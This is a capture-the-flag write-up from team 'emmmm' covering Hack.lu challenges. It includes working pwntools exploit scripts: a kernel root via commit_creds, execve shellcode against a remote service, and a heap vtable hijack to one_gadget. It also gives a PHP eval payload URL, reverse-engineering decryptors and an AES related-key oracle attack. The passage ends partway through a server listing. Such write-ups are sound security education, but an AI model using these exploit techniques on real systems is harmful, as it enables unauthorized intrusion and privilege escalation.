## Hack.lu Writeups by emmmm

> emmmm, we are team based on USTC&BUPT&HIT&M4x

## PWN

### Baby Kernel
This is a simple kernel pwn challenge. We are able to call some function with arguments. And there is no KASLR from hints. So we call `commit_creds(prepare_kernel_cred(0))` to get root then we can read flag.
```python
babykernel bat solve.py 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: solve.py
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/usr/bin/env python
   2   │ # -*- coding: utf-8 -*-
   3   │ 
   4   │ from pwn import *
   5   │ 
   6   │ vmlinux = ELF("./vmlinux", checksec = False)
   7   │ 
   8   │ pkc = vmlinux.sym['prepare_kernel_cred']
   9   │ print "pkc: ", pkc
  10   │ cc = vmlinux.sym['commit_creds']
  11   │ print "cc: ", cc
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────
babykernel python solve.py 
pkc:  18446744071579168336
cc:  18446744071579167184
```

```bash
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
5. Bye!
> 2
uid=1000(user) gid=1000(user) groups=1000(user)
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
random: fast init done
5. Bye!
> 1
I need a kernel address to call. Be careful, though or .
> 
18446744071579168336
There is a good chance we will want to pass an argument?
> 
0
Got call address: 0xffffffff8104ee50, argument: 0x000000
flux_baby ioctl nr 900 called
flux_baby ioctl nr 900 called
flux_baby ioctl extracted param ffffffff8104ee50 as funt
A miracle happened. We came back without crashing! I ev.
It is: ffff88000212c0c0
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
5. Bye!
> 1
I need a kernel address to call. Be careful, though or .
> 
18446744071579167184
There is a good chance we will want to pass an argument?
> 
18446612132349001920 
Got call address: 0xffffffff8104e9d0, argument: 0xffff80
flux_baby ioctl nr 900 called
flux_baby ioctl nr 900 called
flux_baby ioctl extracted param ffffffff8104e9d0 as funt
A miracle happened. We came back without crashing! I ev.
It is: 0000000000000000
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
5. Bye!
> 2
uid=0(root) gid=0(root)
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
5. Bye!
> 3
Which file are we trying to read?
> /flag
Here are your 0xf bytes contents: 
flag{testflag}

```
### baby exploit
modify the jump offset to input， and we can control 7 bytes, so we first use 7 byte to make a read syscall to read the shellcode , and then jump to the shellcode.
```python
from pwn import *

context.arch = 'amd64'

sc = "\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x62\x61\x73\x68\x00"


def decrypt(s):
    sc_list = map(ord, list(s))
    for i in range(len(sc_list) - 2, -1, -1):
      sc_list[i] = sc_list[i+1] ^ sc_list[i]
    sc =  eval(repr(''.join(map(chr, sc_list))))
    return sc




# io = process('./chall')
# io = process('./modified')
io = remote("arcade.fluxfingers.net", 1807)

io.recvuntil("want to flip")
io.sendline("0xbc")
io.recvuntil("byte-offset")
io.sendline("3")
io.recvuntil("win:")

asm_code = '''
pop rax
pop rdx
pop rax
xor edi, edi
syscall
'''

code = asm(asm_code)
log.info(code +  "length: " + str(len(code)))

payload = decrypt('a'*(0x2e - 7) + code)
payload2 = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + sc
# sleep(0.5)
io.send(payload)
sleep(0.5)
io.sendline(payload2)
io.interactive()
```

### heap_heaven_2
The program mmap a heap whose size is 0x2000, and it provide some choices that we can do on the heap, such as write some bytes on it,  free some of it into tcache or bins(need to use write choice to fake heap on it) and choose a offset on the heap and get the value as a point to print(need to write first also). And the program malloc a heap called state and place a vtable point in it(`*state = vtable`), the vatble has two function point, one is menu, the other is bye(`*vtable=&bye,*(vtable+8)=&menu`), menu function is called every time the loop.

After know that, we can easily leak the address of libc、heap and the mmaped heap by faking some heap and free them into fastbin and unsortbin(i didn't do them by using tcache because my local environment dosen't have tcache).

The free choice dosen't check the address is within the mmaped heap or not. So we can free arbitrary address, our target is state, state is a fastbin of size 0x20，we can hijack state->fd point to a fake heap we free into fastbin before it, vtable places in state->fd, and i pce one_gadget in the fake heap. After that, when the program call menu `*((state->vtable)+8)()`, it will call one_gadget.
```python
from pwn import*

def write_heap(length, offset, data):
  p.recvuntil("[5] : exit\n")
  p.sendline("1")
  p.recvuntil("How much do you want to write?\n")
  p.sendline(str(length))
  p.recvuntil("At which offset?")
  p.sendline(str(offset))
  sleep(1)
  p.send(data)

def free_heap(offset):
  p.recvuntil("[5] : exit\n")
  p.sendline("3")
  p.recvuntil("At which offset do you want to free?\n")
  p.sendline(str(offset))

def leak_heap(offset):
  p.recvuntil("[5] : exit\n")
  p.sendline("4")
  p.recvuntil("At which offset do you want to leak?\n")
  p.sendline(str(offset))
  p.recvuntil("a"*16)
  addr = u64(p.recv(6).ljust(8,'\x00'))
  return addr

def leak_heap1(offset):
  p.recvuntil("[5] : exit\n")
  p.sendline("4")
  p.recvuntil("At which offset do you want to leak?\n")
  p.sendline(str(offset))
  addr = u64(p.recv(6).ljust(8,'\x00'))
  return addr

#p = process("./heap_heaven_2")
p = remote("arcade.fluxfingers.net",1809)

x = (p64(0x00) + p64(0x21) + "2"*0x10 + p64(0x00) + p64(0x91) + "1"*0x80)*8
write_heap(len(x),0x1000,x)
free_heap(0x1000+0x10)
free_heap(0x1000+0x10+0xb0)
free_heap(0x1000+0x10+0xb0*2)
free_heap(0x1000+0x10+0xb0*3)
free_heap(0x1000+0x10+0xb0*4)
free_heap(0x1000+0x10+0xb0*5)
free_heap(0x1000+0x10+0xb0*6)

heap1 = p64(0x00) + p64(0x21) + "1"*0x10
heap2 = p64(0x00) + p64(0x21) + "2"*0x10 
heap3 = p64(0x00) + p64(0x421) + "3"*0x410
heap4 = p64(0x00) + p64(0x21) + "4"*0x10
heap5 = p64(0x00) + p64(0x21) + "5"*0x10
heap6 = p64(0x00) + p64(0x31) + "6"*0x20

data1 = heap1 + heap2 + heap3 + heap4 + heap5 + heap6
data2 = "a"*16

write_heap(len(data1),0,data1)
write_heap(len(data1),0x800,data1)
write_heap(len(data1),0x1800,data1)
free_heap(0x1800 + len(heap1) + 0x10)   #heap2
free_heap(0x1800 + len(heap1 + heap2 + heap3) + 0x10) #heap4
free_heap(0x1800 + len(heap1 + heap2 + heap3 + heap4) + 0x10)#heap5

write_heap(len(data2),0x1800+len(heap1 + heap2 + heap3),data2)
mmap = leak_heap(0x1800 + len(heap1 + heap2 + heap3 + heap4) + 0x10) & 0xFFFFFFFFFF
mmap -= len(heap1)
mmap -= 0x1800
print "mmap: " + hex(mmap)

free_heap(len(heap1 + heap2) + 0x10)#heap3
addr2 = leak_heap1(len(heap1 + heap2) + 0x10)
heap = addr2 - 0x290
print "heap: " + hex(heap)

free_heap(len(heap1 + heap2) + 0x10 + 0x800)
write_heap(17,len(heap1 + heap2),"a"*17)
addr1 = leak_heap(len(heap1 + heap2) + 0x10 + 0x800) &0xffffffffff00
libc = addr1 - 0x01BEB00
one = 0xe75f0
one += libc
print "libc:" + hex(libc)

write_heap(len(p64(heap+0x290-0x10)),0x700,p64(heap+0x290-0x10))
func = leak_heap1(0x700)
print hex(func)

write_heap(len(p64(one))*2,0x1800 + len(heap1 + heap2 + heap3 + heap4),(p64(one)*2))
target = heap + 0x290 -0x30
free_heap(target - mmap)
p.interactive()
```

## WEB
### babyphp

> https://arcade.fluxfingers.net:1819/?msg=data:text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ==&key1=1337x&key2=000000000000000000000000000000000001337%EF%BC%84&cc[]=emmm&k1=2&bb=var_dump($flag);//
> flag{7c217708c5293a3264bb136ef1fadd6e}

## REVERSE

### 1-bit-missile 
We know that it is a `bios rom` from the result of `strings ./rom`.

So we run it using `qemu-system-i386 -nographic -bios ./rom` and debugging with `qemu-system-i386 -nographic -bios ./rom -s -S`.

After attaching to the rom, we're able to dump the code in gdb using `dump binary memory dump.bin 0x100000 0xffffff`

> we know the start address is 0x100000 because "*Jumping to boot code at 00100000(07fd7000)*"
> 

Then we open dump.bin with IDA and rebase it to 0x100000. After searching strings, we find an interesting function like:
```C
void __cdecl __noreturn sub_10009E(char a1)
{
  char *a1a; // [esp+4h] [ebp-14h]

  print("FLAG if hit confirmed:");
  if ( (unsigned int)(data[19] ^ data[24]) < data[32] || (unsigned int)(data[19] ^ data[24]) > data[33] )
  {
    print("address out of scope!");
    sub_100160();
  }
  a1a = (char *)malloc(64);
  copy_str(a1a, (char *)(data[19] ^ data[24]));
  if ( *a1a )
    print(a1a);
  else
    print("MISSED!");
  sub_100160();
}
```

So we set a breakpoint at `0x100128`, which is:
```asm
seg000:00100122                 push    [ebp+a2]        ; a2
seg000:00100125                 push    [ebp+a1]        ; a1
seg000:00100128                 call    copy_str
seg000:0010012D                 add     esp, 10h
```

When we take a look in the debugger, we found the arg2 in `copy_str` points NULL, that's why the rom always prints `MISSED!`.
```asm
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────[ REGISTERS ]──────────────────────
 EAX  63 —▸ 0 ◂— 0x0
 EBX  0x7ff3798 —▸ 0x7fef0d9 —▸ 0x505f5342 —▸ 0 ◂— 0x0
 ECX  0x1086e8 —▸ 0x26c0 —▸ 0 ◂— 0x0
 EDX  0 ◂— 0x0
 EDI  0x100000 —▸ 0x906622eb —▸ 0 ◂— 0x0
 ESI  0x1b8 —▸ 0 ◂— 0x0
 EBP  0x10d498 —▸ 0x7ff4fd8 —▸ 0xa0000 —▸ 0 ◂— 0x0
 ESP  0x10d470 —▸ 0x1086a8 —▸ 0 ◂— 0x0
 EIP  0x100128 —▸ 0x3d68e8 —▸ 0 ◂— 0x0
───────────────────────[ DISASM ]───────────────────────
 ► 0x100128    call   0x103e95
 
   0x10012d    add    esp, 0x10
   0x100130    mov    eax, dword ptr [ebp - 0x14]
   0x100133    movzx  eax, byte ptr [eax]
   0x100136    test   al, al
   0x100138    jne    0x10014c
 
   0x10013a    sub    esp, 0xc
   0x10013d    push   0x10500d
   0x100142    call   0x103ca3
 
   0x100147    add    esp, 0x10
   0x10014a    jmp    0x10015a
───────────────────────[ STACK ]────────────────────────
00:0000│ esp  0x10d470 —▸ 0x1086a8 —▸ 0 ◂— 0x0
01:0004│      0x10d474 —▸ 0xc8000 —▸ 0 ◂— 0x0
02:0008│      0x10d478 —▸ 63 —▸ 0 ◂— 0x0
03:000c│      0x10d47c —▸ 1 —▸ 0 ◂— 0x0
04:0010│      0x10d480 —▸ 0x1b8 —▸ 0 ◂— 0x0
05:0014│      0x10d484 —▸ 0x1086a8 —▸ 0 ◂— 0x0
06:0018│      0x10d488 —▸ 0xc8000 —▸ 0 ◂— 0x0
07:001c│      0x10d48c —▸ 64 —▸ 0 ◂— 0x0
Breakpoint *0x100128
pwndbg> x/s 0xc8000
0xc8000:  ""
```

So we search `flag` and found that:
```asm
pwndbg> find /w 0xa0000, 0xe0000, 0x67616c66
0xc0000
1 pattern found.
pwndbg> x/3s 0xc0000
0xc0000:  "flag{xxxxxxxxxx"...
0xc000f:  'x' <repeats 15 times>...
0xc001e:  "xxxxxx}"
```

Clearly, if we change `data[19] ^ data[24] == 0xc0000`, we will get flag.

There are two options:
1. modify 0xef5a3f92 to 0xef5abf92(data[24])
2. modify 0xef56bf92 to 0xef563f92(data[19])

Finally, option 2 works.
```bash
1-bit-missile nc arcade.fluxfingers.net 1816
Enter target byte [0 - 262143]: 194401
]> 10111111 <[
Enter target bit: [0 - 7]: 7
}X> ---------------------------------------{0}
]> 00111111 <[
......
flag{only_cb_can_run_this_simple_elf}
```

### babyre
The program do a simple sequential xor encryption to our input and compare it with a const string. Just decrypt it to get flag
```python
enc = "\x0a\x0d\x06\x1c\"8\x18&6\x0f9+\x1cYB,6\x1a,&\x1c\x17-9WC\x01\x07+8\x09\x07\x1a\x01\x17\x13\x13\x17-9\x0a\x0d\x06F\\}"
encl = map(ord, list(enc))
for i in range(len(encl) - 2, -1, -1):
    encl[i] = encl[i+1] ^ encl[i]
print repr(''.join(map(chr, encl)))

```

### forgetful commander
The program has encrypted code. And the check function is called after `__libc_start_main` function.
The entry function compare `/proc/self/exe` and `/proc/self/maps` to get the address where program is loaded. After that, program decrypt itself and start to execute decrypted code.
I debug the program and find the verification happens in the function at offset 0x2190. Just reverse it.
The decryption is quite simple as below.
```
enc = "\xdf\x98\xe2\x08\xcc\xbb\xeb\xac\x8c\xb2\xaa\xca\x85\xe3\xb2]\xea\x87\x99\xc1Kx\xb8\xe9\xea\x1d^\xd5S\xf8\x0f\x09\xd9\xde\x05|i\x1am\xbdo\x8c4\xd4tN\x1c$]\x83\x1dJ\xa7\xc8l\xc2C\xb6"
table = 'O\xb0\xab6\x1e\xb9Y\x88\xa1\xe1\xf4\xef/\x97w\x834\xa8\xe1po,\xbe\x06\xc6\xb7\xd2\xa3$\x1e\xf1x\xed\xdcO\x9e\xa0\xb2\xf6\x10\xdf\xbe3\xb4\x88\xf8\xeb\xe2\xc0\x1c\xed\x07\x0e\xe5\xb4\xde\x07\xeej\\\xb3\xe87q\x8b\xf5n\xf33\xf0\x86P\xf5\x15\x8b\xed\x84w\x1e{\x02\xe0V^\x93\xba\x1a\x8c\x0f\xd2\xeb\x16\xb3\x83\x98\xfc\xd2\x81\x87\xf3\xa0\'ZO\xe28o\xa0l\xdd\x1d\x11ei\xde\xe7\'\x89\xe2\x95\xb6H9\x00\xf1\x8b`\x1f\xfd\x8bs\x8f}h\xd7:\x19m:\x02\x8a\xc5\x90%\x8c\'wt\x8c\xeb\x90\x1fz%\xf8ja\x8cL\xa6V\x0c\xfbJe\xb4\xeb\x12\x9d\'\xb7B\x8d\x9d\xecv\x96\x8e\xca\x86\x0f\xb2\xc4\x14\x9f\x05\xba\xa7Cz\x7f+\xf936\x1e\xcfUc\x8a\xe2;h\x02?\x18\xd9\xbbm\x8d\xe5K\xbe\x8flX\x1d\xfe\x17b\xb8\xa6\x8f\xb0\xf7+\x14\xc0\xb6\xf0,%\x02/+y\xd8AfR{\xc6\x88rG1\x0c7n4\xe2,\xd4\x95Ch\t&\xbb\x93$?ZfA\xc4\xdc\xaf\xf4\xa2\xa0\x00U#\x1a\t<Q\xa0\xfa\xa6\xdaL)Zm$\x94\x98`\xcb\x19N\xe72|\x98Ln\n!\xcd\x8e\xa8ss\x15\x0bU\xad\xb9"S#3?(\xb5PdV\xc8]N\x89*_\xe5\x94\xe6{\xc4\x15\x1bBpK\x19\x0f\xec\rO\x9a\x1fm?\x10\x1e\x03\x98\x8b\x1bV"'
for j in range(0x40):
    res = ''
    for i in range(0x3a):
        res += chr(ord(enc[i]) ^ ord(table[j + i * 5]))
    print res
```
Note that the value of `j` is decided by following code. The result is relative to [**trapped flag**](https://en.wikipedia.org/wiki/Trap_flag)(0x100). If the program is under debug the value of j is 0x40, ohterwise it's 5. I just brutefore it XD.
```asm
0x00002222      9c             pushfd
0x00002223      5a             pop edx
0x00002224      89d1           mov ecx, edx
0x00002226      81e100010000   and ecx, 0x100
0x0000222c      31ca           xor edx, ecx
0x0000222e      c1c902         ror ecx, 2
0x00002231      31ca           xor edx, ecx
0x00002233      52             push edx
0x00002234      89c2           mov edx, eax
0x00002236      9d             popfd
0x00002237      0f44d1         cmove edx, ecx // j
```

### Snake
This challenge is about QT Reverse engineering. The snake game is not verified until we enter a valid license. 
It's easy to find the verification by searching error message `'This is a valid License'`. The program will decrypt a png encrypted with AES if the license is valid. So we need to find the correct input.
The check function is a QT slot function, which is triggered by relative `signal` function(fileoffset 0x40E0). The signal function will call `activate`, which will find slot function with data stored in QMetaObject, and then call it.

There are two way to find the slot function:
1. debug into activate function and find the call
2. find with QMetaObject just as QT does.
I choose the first way and find the check function at fileoffset 0x6190
![](https://minio.sniperoj.com:443/hackmd/uploads/upload_b6ca10651d3b13e50ebc2f0cb034676f.png)
Not very complicated, decrypt it:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int enc_byte(c, magic) {
    char tmp = ((magic >> 2) | (magic << 6)) ^ 0xAE;
    tmp = ((tmp << 5) | (tmp >> 3)) ^ 0x66;
    char res = c ^ ~((tmp >> 1) | (tmp << 7) | (c >> 4));
    return res;
}

int decrypt(char *enc, char *buf, char fb) {
    char magic = fb;
    int i, j;
    size_t nbytes = strlen(enc);
    printf("decrypting %d bytes\n", nbytes);

    for (i = 0; i < nbytes; i++) {
        for (j = 0x20; j < 0x7f; j++) {
            if (enc_byte(j, magic) == enc[i]) {
                buf[i] = j;
                magic = ~enc[i];
                break;
            }
        }
    }
    return 0;
}

int main() {
    char s[] = {1, 0x95, 'f', '>', 0x1b, 'V', 'd', ',', '(', '\n', 0x9a, 4, 0xad, 0xc, 0xc8, 0xd9, 0};
    char res[0x100] = {0};
    int fb;
    for (fb = 0x20; fb < 0x7f; fb++) {
        if (enc_byte(fb, fb) == s[0]) {
            printf("first byte: 0x%x\n", fb);
            break;
        }
    }
    decrypt(s, res, fb);
    puts(res);
    return 0;
}
```
and we get a license `1Lov3oldArc4de!!`
enter it, and dump the png from memory(need dereference to some pointers of QT object, but not very hard).
![](https://xzfile.aliyuncs.com/media/upload/picture/20181018194708-8ab4aa88-d2cb-1.png)


## CRYPTO
### Relations
```plain
Relations (Category: Crypto)

Author(s): kai Solves: 73
Difficulty: easy

Two completely unrelated operations on completely unrelated values, right? 

nc arcade.fluxfingers.net 1821
```
This task just is a service about AEC-ECB encrypt the flag and give back the base64 encoded ciphertext. The key changes every time.
Let us have a look at the service.
```python
$ nc arcade.fluxfingers.net 1821
------------------------------
Welcome to theory world
------------------------------

------------------------------
Possible Oracles
(XOR) Choose XOR Oracle
(ADD) Choose ADD Oracle
(DEC) For trying to decrypt
-----------------------------*
XOR

Please choose the operand in hex >>> 00
Ciphertext is  01CbySNWb0TnVv/V6M7NVF229tgcV7QDEY6CIG5oyrcq47Z3eaVYKDzmj1a+MG6umsx106NgRvCf
b6uimScNcw==

------------------------------
Possible Oracles
(XOR) Choose XOR Oracle
(ADD) Choose ADD Oracle
(DEC) For trying to decrypt
-----------------------------*
ADD

Please choose the operand in hex >>> 00
Ciphertext is  01CbySNWb0TnVv/V6M7NVF229tgcV7QDEY6CIG5oyrcq47Z3eaVYKDzmj1a+MG6umsx106NgRvCf
b6uimScNcw==

------------------------------
Possible Oracles
(XOR) Choose XOR Oracle
(ADD) Choose ADD Oracle
(DEC) For trying to decrypt
-----------------------------*
DEC

Enter the key base64 encoded >>> YWFhYWFhYWFhYWFhYWFhYQ==
Decryption is  �۔N\_�@a�rмֹs�������`4�-U/�~�:������H��������~8�]�%
------------------------------
Possible Oracles
(XOR) Choose XOR Oracle
(ADD) Choose ADD Oracle
(DEC) For trying to decrypt
-----------------------------*
DEC

Enter the key base64 encoded >>> 111
Traceback (most recent call last):
  File "/home/chall/rka.py", line 113, in <module>
    main()
  File "/home/chall/rka.py", line 106, in main
    key = choose_key()
  File "/home/chall/rka.py", line 64, in choose_key
    return base64.decodestring(key)
  File "/usr/lib/python2.7/base64.py", line 328, in decodestring
    return binascii.a2b_base64(s)
binascii.Error: Incorrect padding
^C

$ nc arcade.fluxfingers.net 1821
------------------------------
Welcome to theory world
------------------------------

------------------------------
Possible Oracles
(XOR) Choose XOR Oracle
(ADD) Choose ADD Oracle
(DEC) For trying to decrypt
-----------------------------*
DEC

Enter the key base64 encoded >>> ABCD
Traceback (most recent call last):
  File "/home/chall/rka.py", line 113, in <module>
    main()
  File "/home/chall/rka.py", line 107, in main
    aes = pyaes.AESModeOfOperationECB(key)
  File "/home/chall/pyaes/aes.py", line 304, in __init__
    self._aes = AES(key)
  File "/home/chall/pyaes/aes.py", line 134, in __init__
    raise ValueError('Invalid key size')
ValueError: Invalid key size

```
So the ADD,XOR is for the key,and the key size is 16 bytes, you can check it by XOR "10"+"00"\*16 and xor "10", and no overflow with the key, I think it may first XOR or ADD, then &"ff"\*16. we can query the oracle byte by byte to get the key, for example if base64(aes_ecb(byteA^key))==base64(aes_ecb(byteA+key)), we can get the one byte key at that position.But this is the single function, we might get more than one key. Just limit the key range and decrypt the cipher offline.
script to get the last 15 byte possible key and ciphertext.
```python
from pwn import *
from base64 import b64decode,b64encode
import sys

#context.log_level = "debug"

io = remote("arcade.fluxfingers.net",1821)

def server(commmand,number):
  io.recvuntil("-----------------------------*\n")
  io.sendline(commmand)
  io.recvuntil("Please choose the operand in hex >>> ")
  io.sendline(number)
  data = io.recvuntil("------------------------------\n")
  return data.split("Ciphertext is  ")[1].split("\n")[0]

def xor_add(xor_key,add_key):
  byte = []
  for i in range(0,256):
    for loop in range(0,len(xor_key)):
      if i^xor_key[loop] != i + add_key[loop]:
        break
      if loop ==len(xor_key)-1:
        byte.append(chr(i))
  print repr(byte)
  return byte

key = []
io.recvuntil("-----------------------------*\n")
io.sendline("XOR")
io.recvuntil("Please choose the operand in hex >>> ")
io.sendline("00")
data = io.recvuntil("------------------------------\n")
print data
for loop in range(0,15):
  flag = False
  xor_aes_result=[]
  add_aes_result=[]
  xor_key=[]
  add_key=[]
  for i in range(1,256):
    xor_aes_result.append(server("XOR",hex(i)+loop*"00"))
  for j in range(1,256):
    data = server("ADD",hex(j)+loop*"00")
    if data in xor_aes_result:
      xor_key.append(xor_aes_result.index(data)+1)
      add_key.append(j)
      flag = True
  # print xor_key,add_key
  if flag:
    key.append(xor_add(xor_key,add_key))
  else:
    key.append(["\xff"])
  print key
```
brute force offline
```python
from base64 import b64decode

c = b64decode("56mMyXpFGdMr48rfyehvxjsuRogij8qydacuhGgDlUepmmnsPnh9hSpfHq9nh/0BSWOkCCt95nQ7JxUmX/0JCg==")

key = [['M'], ['M'], ['Y'], ['\x04', '\x14', '$', '4', 'D', 'T', 'd', 't', '\x84', '\x94', '\xa4', '\xb4', '\xc4', '\xd4', '\xe4', '\xf4'], ['g'], ['@'], ['\n', '*', 'J', 'j', '\x8a', '\xaa', '\xca', '\xea'], ['C'], ['\x05', 'E', '\x85', '\xc5'], ['\x1d'], ['$', '\xa4'], [':'], ['(', '\xa8'], ['\x06'],['\x1d', '\x9d'],['\x00', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', '\x08', '\t', '\n', '\x0b', '\x0c', '\r', '\x0e', '\x0f', '\x10', '\x11', '\x12', '\x13', '\x14', '\x15', '\x16', '\x17', '\x18', '\x19', '\x1a', '\x1b', '\x1c', '\x1d', '\x1e', '\x1f', ' ', '!', '"', '#', '$', '%', '&', "'",
 '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~', '\x7f', '\x80', '\x81', '\x82', '\x83', '\x84', '\x85', '\x86', '\x87', '\x88', '\x89', '\x8a', '\x8b', '\x8c', '\x8d', '\x8e', '\x8f', '\x90', '\x91', '\x92', '\x93', '\x94', '\x95', '\x96', '\x97', '\x98', '\x99', '\x9a', '\x9b', '\x9c', '\x9d', '\x9e', '\x9f', '\xa0', '\xa1', '\xa2', '\xa3', '\xa4', '\xa5', '\xa6', '\xa7', '\xa8', '\xa9', '\xaa', '\xab', '\xac', '\xad', '\xae', '\xaf', '\xb0', '\xb1', '\xb2', '\xb3', '\xb4', '\xb5', '\xb6', '\xb7', '\xb8', '\xb9', '\xba', '\xbb', '\xbc', '\xbd', '\xbe', '\xbf', '\xc0', '\xc1', '\xc2', '\xc3', '\xc4', '\xc5', '\xc6', '\xc7', '\xc8', '\xc9', '\xca', '\xcb', '\xcc', '\xcd', '\xce', '\xcf', '\xd0', '\xd1', '\xd2', '\xd3', '\xd4', '\xd5', '\xd6', '\xd7', '\xd8', '\xd9', '\xda', '\xdb', '\xdc', '\xdd', '\xde', '\xdf', '\xe0', '\xe1', '\xe2', '\xe3', '\xe4', '\xe5', '\xe6', '\xe7', '\xe8', '\xe9', '\xea', '\xeb', '\xec', '\xed', '\xee', '\xef', '\xf0', '\xf1', '\xf2', '\xf3', '\xf4', '\xf5', '\xf6', '\xf7', '\xf8', '\xf9', '\xfa', '\xfb', '\xfc', '\xfd', '\xfe', '\xff']]
for key0 in key[0]:
  for key1 in key[1]:
    for key2 in key[2]:
      for key3 in key[3]:
        for key4 in key[4]:
          for key5 in key[5]:
            for key6 in key[6]:
              for key7 in key[7]:
                for key8 in key[8]:
                  for key9 in key[9]:
                    for key10 in key[10]:
                      for key11 in key[11]:
                        for key12 in key[12]:
                          for key13 in key[13]:
                            for key14 in key[14]:
                              for key15 in key[15]:
                                k = key0+key1+key2+key3+key4+key5+key6+key7+key8+key9+key10+key11+key12+key13+key14+key15
                                aes = pyaes.AESModeOfOperationECB(k[::-1])
                                print k[::-1]
                                m = aes.decrypt(c[:16])+aes.decrypt(c[16:32])+aes.decrypt(c[32:48])+aes.decrypt(c[48:64])
                                if "flag" in m:
                                  print m
                                  exit(1)
#flag  flag{r3l4t3d_k3y_der1iviNg_fuNct1on5_h4ve_to_be_a_l1mit3d_cla55}                                       
```
### Multiplayer Part 1
```plain
description
Multiplayer Part 1 (Category: Crypto)

Author(s): asante, kai Solves: 40
Difficulty: medium

Can you get the pole position of this elliptic racing curve contactless?

nc arcade.fluxfingers.net 1822

Download
```
three files named parameters.sage,server.sage and points.db.
> parameters.sage

```python
param = {   "hacklu":
            ((889774351128949770355298446172353873, 12345, 67890),
            # Generator of Subgroup of prime order 73 bits, 79182553273022138539034276599687 to be excact
            (238266381988261346751878607720968495, 591153005086204165523829267245014771),
            # challenge Q = xP, x random from [0, 79182553273022138539034276599687)
            (341454032985370081366658659122300896, 775807209463167910095539163959068826)
            )
        }

serverAdress = '0.0.0.0'
serverPort = 23426

(p, a, b), (px, py), (qx, qy) = param["hacklu"]
E = EllipticCurve(GF(p), [a, b])
P = E((px, py))
Q = E((qx, qy))
```
> server.sage

```python
import asyncore, socket, json, sqlite3, time

FLAG1 = "flag{XXXXXXXXXXX}"
POINT_TRESHOLD = 200

def json_response(code, additional_parameter=""):
    response_codes = {
        0 : "Point added",
        1 : "Collision found",
        2 : "Point already included",
        3 : 'Wrong input format. Please provide a string like this: {"x": val, "y": val, "c": val, "d": val, "groupID": val})',
        4 : "Value mismatch! X != c*P + d*Q",
        5 : "Server Error"
    }
    return '{"Response": "%d", "Message": "%s"%s}' % (code, response_codes[code], additional_parameter)


# Teams should choose a non-guessable groupID
def get_response(x, y, c, d, groupID):
    # open connection to database
    conn = sqlite3.connect("points.db")
    conn.row_factory = sqlite3.Row
    conn_cursor = conn.cursor()

    # convert sage integers to string to avoid "Python int too large for SQLite INTEGER"
    x = str(x)
    y = str(y)
    c = str(c)
    d = str(d)

    # Select records that map to the same X value
    conn_cursor.execute("SELECT * FROM points WHERE x = :x", {"x": x})
    query = conn_cursor.fetchall()
    # No record found -> Point is not yet included
    if len(query) == 0:
        # Insert point into database
        conn_cursor.execute("INSERT INTO points (x, y, c, d, groupID) VALUES (?, ?, ?, ?, ?)",
                  (x, y, c, d, groupID))
        # Get number of points added by this group
        conn_cursor.execute("SELECT x FROM points WHERE groupID = :gID", {"gID": groupID})
        points_found = conn_cursor.fetchall()
        add_param = ', "points_found": %d' % len(points_found)
        # When they found POINT_TRESHOLD distinguished points and a collision occured, return the colliding values as well
        if len(points_found) > POINT_TRESHOLD:
            add_param += ', "flag1": "%s"' % FLAG1
            if server.collision_found:
                # compute x from the collision, second flag is just x (not in flag format)
                add_param += ', "collision": %s' % (server.collision)
        response = json_response(0, add_param)
    else:
        # One (or more) records found -> check if they have the same exponents
        is_included = False
        for row in query:
            if row["c"] == c and row["d"] == d:
                is_included = True
                response = json_response(2)
                break

        if not is_included:
            # Exponents are different -> Collision found, add this point
            conn_cursor.execute("INSERT INTO points (x, y, c, d, groupID, collision) VALUES (?, ?, ?, ?, ?, 1)",
                      (x, y, c, d, groupID))
            # Get number of points added by this group
            conn_cursor.execute("SELECT x FROM points WHERE groupID = :gID", {"gID": groupID})
            points_found = conn_cursor.fetchall()
            add_param = ', "points_found": %d' % len(points_found)
            # add collision
            server.collision_found = True
            server.collision = '{"c_1": %s, "d_1": %s, "c_2": %s, "d_2": %s}' % (c, d, row["c"], row["d"])
            if len(points_found) > POINT_TRESHOLD:
                add_param += ', "collision": %s' % (server.collision)
            else:
                add_param += ', "collision": "collision found but not enough distinguished points submitted yet"'

            response = json_response(1, add_param + ', "c": %s, "d": %s' % (row["c"], row["d"]))

    # close db connection and return response
    conn.commit()
    conn_cursor.close()
    conn.close()
    return response


class DLogHandler(asyncore.dispatcher_with_send):

    def handle_read(self):
        try:
            json_data = self.recv(8192)
            if not json_data:
                return

            data = json.loads(json_data)
            print data
            # check if the format is correct
            if not ("x" in data and "y" in data and "c" in data and "d" in data and "groupID" in data):
                response = json_response(3)
            else:
                c = Integer(data["c"])
                print c
                d = Integer(data["d"])
                x = Integer(data["x"])
                y = Integer(data["y"])
                print y
                X = E((x, y))
                print X
                print data
                print X
                if X == c*P + d*Q:
                    print data
                    response = get_response(data["x"], data["y"], data["c"], data["d"], data["groupID"])
                else:
                    print("expected %s = %d*%s + %d*%s, but got %s" % (c*P + d*Q, c, P, d, Q, X))
                    response = json_response(4)

            self.send(response)

